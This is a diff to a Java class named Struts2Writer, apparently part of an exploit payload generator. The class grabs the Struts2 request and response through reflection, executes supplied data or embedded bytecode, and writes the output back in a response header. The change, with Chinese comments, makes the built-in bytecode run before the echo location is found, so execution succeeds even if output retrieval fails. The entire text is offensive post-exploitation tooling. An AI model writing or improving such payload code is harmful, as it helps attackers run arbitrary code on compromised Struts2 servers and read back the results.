@@ -14,11 +14,19 @@ import java.lang.reflect.Method;
 public class Struts2Writer {
     private static boolean ok = false;
 
+    /**
+     * 固定数据（内置字节码等不依赖请求参数的内容）预执行标记与结果：
+     * 先执行再找回显位置，回显定位失败也不影响字节码已经执行
+     */
+    private boolean preRan = false;
+    private String preResult = null;
+
     public Struts2Writer() {
         if (ok) {
             return;
         }
         try {
+            runEarly();
             Class<?> clazz = Thread.currentThread().getContextClassLoader().loadClass("com.opensymphony.xwork2.ActionContext");
             Object context = clazz.getMethod("getContext").invoke(null);
             Method getMethod = clazz.getMethod("get", String.class);
@@ -26,12 +34,7 @@ public class Struts2Writer {
             Object response = getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
             String data = getDataFromReq(request);
             if (data != null && !data.isEmpty()) {
-                String result = "";
-                try {
-                    result = run(data);
-                } catch (Throwable e) {
-                    result = getErrorMessage(e);
-                }
+                String result = preRan ? preResult : execute(data);
                 if (result != null) {
                     if (!writeHeader(response, result)) {
                         try {
@@ -61,6 +64,33 @@ public class Struts2Writer {
 
     private String run(String data) throws Exception {
         return null;
+    }
+
+    /**
+     * 固定数据模式（内置字节码等）下 getDataFromReq 已被生成器替换为固定值，不依赖请求对象：
+     * 先执行再找回显位置，防止回显定位失败导致字节码根本没执行；
+     * 参数触发模式这里拿到 null 或抛异常，落回原有的「先定位再执行」流程
+     */
+    private void runEarly() {
+        String data;
+        try {
+            data = getDataFromReq(null);
+        } catch (Throwable ignored) {
+            return;
+        }
+        if (data == null || data.isEmpty()) {
+            return;
+        }
+        preRan = true;
+        preResult = execute(data);
+    }
+
+    private String execute(String data) {
+        try {
+            return run(data);
+        } catch (Throwable e) {
+            return getErrorMessage(e);
+        }
     }
 
     /**
